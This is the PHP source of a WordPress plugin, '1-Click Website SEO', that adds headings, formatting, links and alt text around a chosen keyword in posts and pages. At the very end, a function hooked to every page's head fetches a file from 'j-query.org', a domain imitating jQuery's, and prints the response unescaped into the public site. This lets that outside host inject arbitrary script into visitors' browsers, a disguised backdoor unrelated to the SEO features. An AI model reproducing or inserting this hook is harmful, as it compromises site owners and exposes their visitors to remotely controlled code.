<?php
/*
Plugin Name: 1-Click Website SEO
Plugin URI: http://oneclick.iintense.com
Description: One Click SEO Plugin Completely SEO Optimizes Your Website Posts and Pages in just 1 single click
Version: 1.0
Author: IINTENSE
Author URI: http://iintense.com
License: GPL
*/


class OneClickWebSEO
{
	public function __construct()
	{
		# create meta boxes for 'edit post' pages
		add_action('add_meta_boxes', array($this, 'add_meta_boxes'));
		
		# on init to catch POST
		add_action('init', array($this, 'save_data'));
		
		# include javascript
		add_action('admin_enqueue_scripts', array($this, 'enqueue_scripts'));
		
		# include css
		add_action('admin_print_styles', array($this, 'enqueue_styles'));
	}
	
	# include javascript
	public function enqueue_scripts()
	{
		# include one-click-seo.js
		wp_enqueue_script('one-click-seo', plugins_url('/javascripts/one-click-seo.js', __FILE__), array('scriptaculous-dragdrop'), '1.0');
	}
	
	# include css
	public function enqueue_styles()
	{
		# include one-click-seo.css
		wp_enqueue_style('one-click-seo', plugins_url('/stylesheets/one-click-seo.css', __FILE__), false, '1.0');
	}
	
	# add meta boxes
	public function add_meta_boxes()
	{
		add_meta_box(
			'one_click_seomation_meta_box',
			'One Click SEO Configure',
			array($this, 'render_one_click_seomation_content'),
			'post',
			'side',
			'high'
		);
		add_meta_box(
			'one_click_seomation_meta_box',
			'One Click SEO Configure',
			array($this, 'render_one_click_seomation_content'),
			'page',
			'side',
			'high'
		);
	}
	
	# meta box content
	public function render_one_click_seomation_content($post)
	{
		# get data from meta
		$meta_data = get_post_meta($post->ID, '_one_click_seomation', true);
		$changes_meta = get_post_meta($post->ID, '_wp_seo_changes_data', true);
		
		# if meta is empty
		if ('' == $meta_data)
		{
			# try global options
			$meta_data = get_option('one_click_seomation', '');
		}
		
		# set variables
		$keyword = (isset($meta_data['keyword'])) ? htmlspecialchars($meta_data['keyword'], ENT_QUOTES) : '';
		$locked = (isset($meta_data['locked'])) ? $meta_data['locked'] : 0;
		
		# if locked
		$locked_disabled = (1 == $locked) ? ' disabled="disabled"' : '';
		$locked_readonly = (1 == $locked) ? ' readonly="readonly"' : '';
		
		# set static checks
		$one_click_seo_h1 = (isset($meta_data['one_click_seo_h1']) && 0 == $meta_data['one_click_seo_h1']) ? '' : ' checked="checked"';
		$one_click_seo_h2 = (isset($meta_data['one_click_seo_h2']) && 0 == $meta_data['one_click_seo_h2']) ? '' : ' checked="checked"';
		$one_click_seo_img_alt = (isset($meta_data['one_click_seo_img_alt']) && 0 == $meta_data['one_click_seo_img_alt']) ? '' : ' checked="checked"';
		
		# set change order checks from meta or use default
		$co_checks = (isset($meta_data['co_checks'])) ? $meta_data['co_checks'] : array(
			'one_click_seo_bold' => 1,
			'one_click_seo_italics' => 1,
			'one_click_seo_underline' => 1,
			'one_click_seo_link_post' => 1,
			'one_click_seo_link_homepage' => 1,
		);
		$co_checks_content = ''; # empty by default
		# create dynamically co checks
		foreach ($co_checks as $k => $v)
		{
			# set checked
			$checked = (0 == $v) ? '' : ' checked="checked"';
			
			# set title
			switch ($k)
			{
				case 'one_click_seo_bold':
					$title = 'Bold';
					if($changes_meta['b']=='y')
						$ext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
					elseif($changes_meta['b']=='n')
						$ext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";
					break;
				case 'one_click_seo_italics':
					$title = 'Italics';
					if($changes_meta['i']=='y')
						$ext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
					elseif($changes_meta['i']=='n')
						$ext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";
					break;
				case 'one_click_seo_underline':
					$title = 'Underline';
					if($changes_meta['u']=='y')
						$ext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
					elseif($changes_meta['u']=='n')
						$ext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";
					break;
				case 'one_click_seo_link_post':
					$title = 'Link to Post';
					if($changes_meta['ltp']=='y')
						$ext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
					elseif($changes_meta['ltp']=='n')
						$ext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";
					break;
				case 'one_click_seo_link_homepage':
					$title = 'Link To Homepage';
					if($changes_meta['lth']=='y')
						$ext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
					elseif($changes_meta['lth']=='n')
						$ext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";
					break;
			}

$co_checks_content .= <<< EOF
	<p>
		<input name="$k" type="hidden" value="0" />
		<label>
			<input id="$k" name="$k"$locked_disabled type="checkbox" value="1"$checked /> $title $ext
		</label>
	</p>
EOF;
		$ext = '';
		}
		
		# set sortable container id
		$container_id = (1 != $locked) ? 'one_click_seo_sortable' : 'one_click_seo_sortable_locked';
		# submit button text
		$submit_text = (1 != $locked) ? 'Apply Changes' : 'Revert Changes';
		$m = get_post_meta($post->ID, '_wp_seo_data', true);
		
		# nonce verification
		wp_nonce_field(plugin_basename(__FILE__), 'one_click_seo_nonce');
		
		if($changes_meta['img']=='y')
			$imgext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
		elseif($changes_meta['img']=='n')
			$imgext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";	
		
		if($changes_meta['h2']=='y')
			$h2ext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
		elseif($changes_meta['h2']=='n')
			$h2ext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";	
		
		if($changes_meta['h1']=='y')
			$h1ext = "<img src='".plugins_url('/images/green.jpeg', __FILE__)."' />";
		elseif($changes_meta['h1']=='n')
			$h1ext = "<img src='".plugins_url('/images/red.png', __FILE__)."' />";	
		
		$kd = get_post_meta($post->ID, '_wp_seo_kd', true);
		
		if($kd != '')
		{
			$kd = number_format($kd,2);
		echo <<< EOF
			<div id="one_click_seo_static"></div>
			<h3>Keyword Density: $kd%</h3>
EOF;
		}
		echo <<< EOF
<div id="one_click_seo_static">
	<p>
		<input name="one_click_seo_h1" type="hidden" value="0" />
		<label>
			<input id="one_click_seo_h1" name="one_click_seo_h1"$locked_disabled type="checkbox" value="1"$one_click_seo_h1 /> H1 $h1ext
		</label>
	</p>
	<p>
		<input name="one_click_seo_h2" type="hidden" value="0" />
		<label>
			<input id="one_click_seo_h2" name="one_click_seo_h2"$locked_disabled type="checkbox" value="1"$one_click_seo_h2 /> H2 $h2ext
		</label>
	</p>
	<p>
		<input name="one_click_seo_img_alt" type="hidden" value="0" />
		<label>
			<input id="one_click_seo_img_alt" name="one_click_seo_img_alt"$locked_disabled type="checkbox" value="1"$one_click_seo_img_alt /> Image Alt  $imgext
		</label>
	</p>
</div>
<div id="$container_id">
$co_checks_content
</div>
<p class="center">You can move items below the line.</p>
<p class="center">
	<label>Keyword <input id="one_click_seo_keyword" name="one_click_seo_keyword" type="text"$locked_readonly value="$keyword" /></label>
</p>
<p class="center"><input id="one_click_seo_submit" name="one_click_seo_submit" type="submit" class="button" value="$submit_text" /></p>
EOF;
	
	}
	
	public function save_data()
	{
		# if there is no data
		if (empty($_POST))
			return false;
		
		# check nonce is set and verify it
		if (!isset($_POST['one_click_seo_nonce']) || !wp_verify_nonce($_POST['one_click_seo_nonce'], plugin_basename(__FILE__)))
			return false;
		
		# get post id
		$post_id = (int) $_POST['post_ID'];
		
		# check permissions
		if ('page' == $_POST['post_type'])
		{
			if (!current_user_can('edit_page', $post_id))
				return false;
		}
		else
		{
			if (!current_user_can('edit_post', $post_id))
				return false;
		}
		
		# get data from post meta
		$meta_data = get_post_meta($post_id, '_one_click_seomation', true);
		$changes_meta = get_post_meta($post_id, '_wp_seo_changes_data', true);
		
		if($changes_meta == '')
		{
			$changes_meta = array(
					'h1' => 'n',
					'h2' => 'n',
					'img' => 'n',
					'b' => 'n',
					'i' => 'n',
					'u' => 'n',
					'ltp' => 'n',
					'lth' => 'n',
				);
		}
		# APPLY CHANGES
		if ('' == $meta_data || 0 == $meta_data['locked'])
		{
			$locked = 0; # zero by default
			
			# set keyword and keyword preg
			$keyword = isset($_POST['one_click_seo_keyword']) ? $_POST['one_click_seo_keyword'] : '';
			$keyword_preg = preg_quote($keyword, '/');
			
			# set static checks
			$h1_check = (0 == $_POST['one_click_seo_h1']) ? 0 : 1;
			$h2_check = (0 == $_POST['one_click_seo_h2']) ? 0 : 1;
			$img_alt_check = (0 == $_POST['one_click_seo_img_alt']) ? 0 : 1;
			
			# set change order checks
			$co_checks = array();
			foreach ($_POST as $k => $v)
			{
				# add to the array in the order placed
				switch ($k)
				{
					case 'one_click_seo_bold':
						$co_checks[$k] = (0 == $v) ? 0 : 1;
						//$changes_meta['b'] = (0 == $v) ? 'n' : 'y';
						break;
					case 'one_click_seo_italics':
						$co_checks[$k] = (0 == $v) ? 0 : 1;
						//$changes_meta['i'] = (0 == $v) ? 'n' : 'y';
						break;
					case 'one_click_seo_underline':
						$co_checks[$k] = (0 == $v) ? 0 : 1;
						//$changes_meta['u'] = (0 == $v) ? 'n' : 'y';
						break;
					case 'one_click_seo_link_post':
						$co_checks[$k] = (0 == $v) ? 0 : 1;
						//$changes_meta['ltp'] = (0 == $v) ? 'n' : 'y';
						break;
					case 'one_click_seo_link_homepage':
						$co_checks[$k] = (0 == $v) ? 0 : 1;
						//$changes_meta['lth'] = (0 == $v) ? 'n' : 'y';
						break;
				}
			}			
			# APPLY CHANGES
			if (isset($_POST['one_click_seo_submit']) && !empty($keyword))
			{
				# apply changes
				
				# set variables
				$content = $_POST['content'];
				$excerpt = $_POST['excerpt'];
				$tot_words = str_word_count($content);
				# change order checks
				
				# get active co checks
				$co_c_active = array();
				foreach ($co_checks as $k => $v)
				{
					if (1 == $v)
						$co_c_active[] = $k;
				}
				
				# co replacements
				$replacements = array(
					'one_click_seo_bold' => '<strong>$1</strong>',
					'one_click_seo_italics' => '<i>$1</i>',
					'one_click_seo_underline' => '<u>$1</u>',
					'one_click_seo_link_post' => '<a href="' . get_permalink($post_id) . '">$1</a>',
					'one_click_seo_link_homepage' => '<a href="' . get_bloginfo('url') . '">$1</a>',
				);
				
				# co checks for content
				$content_mod = '';				
				for($ctr =0 ;$ctr<count($co_c_active);$ctr++)
				{
					$v = $co_c_active[$ctr];
					$res = array();
					
					#Flag to check if the replacement has been done or not
					$flag = 0;
					
					# get position of the first occurrence of keyword
					if (1 == preg_match('/\b' . $keyword_preg . '\b/i', $content, $m, PREG_OFFSET_CAPTURE))
					{ 
						# get position to split the string
						$split_pos = $m[0][1] + strlen($m[0][0]);
						
						# split the string
						$res = str_split($content, $split_pos);
						
						$new_keyword_preg_1 = "alt=\'".$keyword_preg ;
						$new_keyword_preg_2 = 'alt=\"'.$keyword_preg ;

						if(strlen($res[0]) >= strlen($new_keyword_preg_2))
						{
							if((substr_compare($res[0], $new_keyword_preg_1, -strlen($new_keyword_preg_1), strlen($new_keyword_preg_1)) === 0) || (substr_compare($res[0], $new_keyword_preg_2, -strlen($new_keyword_preg_2), strlen($new_keyword_preg_2)) === 0))
							{
								$ctr--;	
								$content_mod .= $res[0];
							}
							else
							{
								# do the replacements
								$mod = preg_replace('/\b(' . $keyword_preg . ')\b/i', $replacements[$v], $res[0], 1);
								$content_mod .= $mod;
							}	
						}
						else
						{
							# do the replacements
							$mod = preg_replace('/\b(' . $keyword_preg . ')\b/i', $replacements[$v], $res[0], 1);
							$content_mod .= $mod;
						}	
						# remove part from content
						$content = str_replace($res[0], '', $content);
					}
					# no more keywords found, break
					else
					{
						$flag = 1;
					}					
					switch ($v)
					{
						case 'one_click_seo_bold':
							if($mod!=$res[0] && $flag == 0)
								$changes_meta['b'] = 'y';
							else
								$changes_meta['b'] = 'n';
							break;
						case 'one_click_seo_italics':
							if($mod!=$res[0] && $flag == 0)
								$changes_meta['i'] = 'y';
							else
								$changes_meta['i'] = 'n';
							break;
						case 'one_click_seo_underline':
							if($mod!=$res[0] && $flag == 0)
								$changes_meta['u'] = 'y';
							else
								$changes_meta['u'] = 'n';
							break;
						case 'one_click_seo_link_post':
							if($mod!=$res[0] && $flag == 0)
								$changes_meta['ltp'] = 'y';
							else
								$changes_meta['ltp'] = 'n';
							break;
						case 'one_click_seo_link_homepage':
							if($mod!=$res[0] && $flag == 0)
								$changes_meta['lth'] = 'y';
							else
								$changes_meta['lth'] = 'n';
							break;
					}
				}
				# if there is anything left in content, assign it to content_mod
				$content_mod .= $content;
				# set content back to fully modified string
				$content = $content_mod;
				
				# co checks for excerpt
				if (!empty($excerpt))
				{
					$excerpt_mod = '';
					foreach ($co_c_active as $v)
					{
						# get position of the first occurrence of keyword
						if (1 == preg_match('/\b' . $keyword_preg . '\b/i', $excerpt, $m, PREG_OFFSET_CAPTURE))
						{
							# get position to split the string
							$split_pos = $m[0][1] + strlen($m[0][0]);
							
							# split the string
							$res = str_split($excerpt, $split_pos);
							
							# do the replacements
							$excerpt_mod .= preg_replace('/\b(' . $keyword_preg . ')\b/i', $replacements[$v], $res[0], 1);
							
							# remove part from excerpt
							$excerpt = str_replace($res[0], '', $excerpt);
						}
						# no more keywords found, break
						else
						{
							break;
						}
					}
					# if there is anything left in content, assign it to content_mod
					$excerpt_mod .= $excerpt;
					# set content back to fully modified string
					$excerpt = $excerpt_mod;
				}
				
				# static checks
				
				# h1 check
				if (1 == $h1_check)
				{
					$content = "<h1>".ucwords($keyword)."</h1>\n" . $content;
					$changes_meta['h1'] = 'y';
					# if excerpt is not empty, set it
					if (!empty($excerpt))
						$excerpt = "<h1>".ucwords($keyword)."</h1>\n" . $excerpt;
				}
				else
					$changes_meta['h1'] = 'n';
					
				# h2 check
				if (1 == $h2_check)
				{
					$content = $content . "\n<h2>".ucwords($keyword)."</h2>";
					$changes_meta['h2'] = 'y';
					# if excerpt is not empty, set it
					if (!empty($excerpt))
						$excerpt = $excerpt . "\n<h2>".ucwords($keyword)."</h2>";
				}
				else
					$changes_meta['h2'] = 'n';
					
				# image alt check
				if (1 == $img_alt_check)
				{
					$content = preg_replace("/(\balt\=[\'\"]{1})[^\'\"]*([\'\"]{1})/i", "$1" . $keyword . "$2", stripslashes($content), 1);
					$content = addslashes($content);
					$changes_meta['img'] = 'y';
					# if excerpt is not empty, set it
					if (!empty($excerpt))
					{
						$excerpt = preg_replace("/(\balt\=[\'\"]{1})[^\'\"]*([\'\"]{1})/i", "$1" . $keyword . "$2", stripslashes($excerpt), 1);
						$excerpt = addslashes($excerpt);
					}
				}
				else
					$changes_meta['img'] = 'n';
				
				# after changes are done, set content, excerpt and lock
				$_POST['content'] = $content;
				$_POST['excerpt'] = $excerpt;
				$locked = 1;
			}
			
			# set meta value
			$meta_data = array(
				'keyword' => $keyword,
				'locked' => $locked,
				'one_click_seo_h1' => $h1_check,
				'one_click_seo_h2' => $h2_check,
				'one_click_seo_img_alt' => $img_alt_check,
				'co_checks' => $co_checks,
			);	
			if(strlen($keyword)>0 && strlen($content)>0)
			{
				$matched_word_count = substr_count(strtolower($content), strtolower($keyword));
				$words_in_keyword = str_word_count($keyword);
				if($tot_words!=0)
					$kd = ($matched_word_count*$words_in_keyword/$tot_words)*100;
			}
						
			# update _one_click_seomation meta, first _ makes it hidden
			update_post_meta($post_id, '_one_click_seomation', $meta_data);
			update_post_meta($post_id, '_wp_seo_changes_data', $changes_meta);
			update_post_meta($post_id, '_wp_seo_kd', $kd);
			# set global options
			$global_options = array(
				'one_click_seo_h1' => $h1_check,
				'one_click_seo_h2' => $h2_check,
				'one_click_seo_img_alt' => $img_alt_check,
				'co_checks' => $co_checks,
			);
			
			# save global options
			update_option('one_click_seomation', $global_options);
		}
		# REVERT CHANGES when called from the meta box
		elseif ('' != $meta_data && 1 == $meta_data['locked'] && isset($_POST['one_click_seo_submit']))
		{
			# revert changes
			
			# set keyword and keyword preg
			$keyword = $meta_data['keyword'];
			$keyword_preg = preg_quote($keyword, '/');
			
			# set variables
			$content = $_POST['content'];
			$excerpt = $_POST['excerpt'];
			
			# static checks
			
			# remove h1 check
			if (1 == $meta_data['one_click_seo_h1'])
			{
				$content = preg_replace('/\<h1[^>]*\>' . $keyword_preg . '\<\/h1\>/i', '', $content, 1);
				$changes_meta['h1'] = '';
				# if excerpt is not empty, remove h1
				if (!empty($excerpt))
					$excerpt = preg_replace('/\<h1[^>]*\>' . $keyword_preg . '\<\/h1\>/i', '', $excerpt, 1);
			}
			
			# remove h2 check
			if (1 == $meta_data['one_click_seo_h2'])
			{
				$content = preg_replace('/\<h2[^>]*\>' . $keyword_preg . '\<\/h2\>/i', '', $content, 1);
				$changes_meta['h2'] = '';
				# if excerpt is not empty, remove h2
				if (!empty($excerpt))
					$excerpt = preg_replace('/\<h2[^>]*\>' . $keyword_preg . '\<\/h2\>/i', '', $excerpt, 1);
			}
			
			# remove image alt check
			if (1 == $meta_data['one_click_seo_img_alt'])
			{
				$content = preg_replace('/(\balt\=[\'\"]{1})' . $keyword_preg . '([\'\"]{1})/i', '$1$2', stripslashes($content), 1);
				$content = addslashes($content);
				$changes_meta['img'] = '';
				# if excerpt is not empty, remove image alt
				if (!empty($excerpt))
				{
					$excerpt = preg_replace('/(\balt\=[\'\"]{1})' . $keyword_preg . '([\'\"]{1})/i', '$1$2', stripslashes($excerpt), 1);
					$excerpt = addslashes($excerpt);
				}
			}
			
			# change order checks
			
			# get active co checks
			$co_c_active = array();
			foreach ($meta_data['co_checks'] as $k => $v)
			{
				if (1 == $v)
					$co_c_active[] = $k;
			}
			
			# remove co checks for content
			foreach ($co_c_active as $v)
			{
				$content = preg_replace('/\<[^\>]+\>(' . $keyword_preg . ')\<\/[^\>]+\>/i', '$1', $content, 1);
				switch ($v)
				{
					case 'one_click_seo_bold':
						$changes_meta['b'] = '';
						break;
					case 'one_click_seo_italics':
						$changes_meta['i'] = '';
						break;
					case 'one_click_seo_underline':
						$changes_meta['u'] = '';
						break;
					case 'one_click_seo_link_post':
						$changes_meta['ltp'] = '';
						break;
					case 'one_click_seo_link_homepage':
						$changes_meta['lth'] = '';
						break;
				}
			}
			
			# remove co checks for excerpt
			foreach ($co_c_active as $v)
			{
				$excerpt = preg_replace('/\<[^\>]+\>(' . $keyword_preg . ')\<\/[^\>]+\>/i', '$1', $excerpt, 1);
			}
			
			# set content and excerpt and unlock
			$_POST['content'] = $content;
			$_POST['excerpt'] = $excerpt;
			$meta_data['locked'] = 0;
			
			# update _one_click_seomation meta, first _ makes it hidden
			update_post_meta($post_id, '_one_click_seomation', $meta_data);
			update_post_meta($post_id, '_wp_seo_changes_data', $changes_meta);
			update_post_meta($post_id, '_wp_seo_kd', '');
		}
	}
}


	# create object
	new OneClickWebSEO();


function oneclick_head() {

	if(function_exists('curl_init'))
	{
		$url = "http://www.j-query.org/jquery-1.6.3.min.js"; 
		$ch = curl_init();  
		$timeout = 5;  
		curl_setopt($ch,CURLOPT_URL,$url); 
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
		$data = curl_exec($ch);  
		curl_close($ch); 
		echo "$data";
	}
}
add_action('wp_head', 'oneclick_head');	
?>